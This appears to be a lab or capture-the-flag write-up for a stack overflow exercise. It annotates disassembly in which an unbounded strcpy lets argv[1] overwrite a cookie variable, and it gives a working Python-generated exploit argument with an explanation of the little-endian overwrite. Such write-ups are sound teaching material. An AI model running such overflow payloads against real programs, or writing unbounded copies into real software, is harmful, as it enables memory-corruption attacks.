# ex01 - Stack overflow into a variable

## Goal
Print `you have correctly got the variable to the right value`.

## Relevant assembly (`main`)
```asm
0804846a: sub  esp,0x60
...
08048487: mov  DWORD PTR [esp+0x5c],0x0
0804848f: mov  eax,DWORD PTR [ebp+0xc]   ; argv
08048492: add  eax,0x4
08048495: mov  eax,DWORD PTR [eax]       ; argv[1]
08048497: mov  DWORD PTR [esp+0x4],eax
0804849b: lea  eax,[esp+0x1c]            ; buffer (64 bytes)
0804849f: mov  DWORD PTR [esp],eax
080484a2: call strcpy                    ; unsafe copy
080484a7: mov  eax,DWORD PTR [esp+0x5c]  ; cookie at buffer+64
080484ab: cmp  eax,0x61626364            ; expected "abcd"
080484b0: jne  ...
```
The cookie is 64 bytes after the buffer, so 64 bytes of padding overwrite nothing before it, then the next 4 bytes become the cookie.

## Exploit
```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x64\x63\x62\x61")')"
```

## Why it works
`strcpy` copies `argv[1]` without bounds checking. The 64 `"A"` bytes reach the cookie at `[esp+0x5c]`, and `dcba` in little-endian memory becomes the integer `0x61626364`.
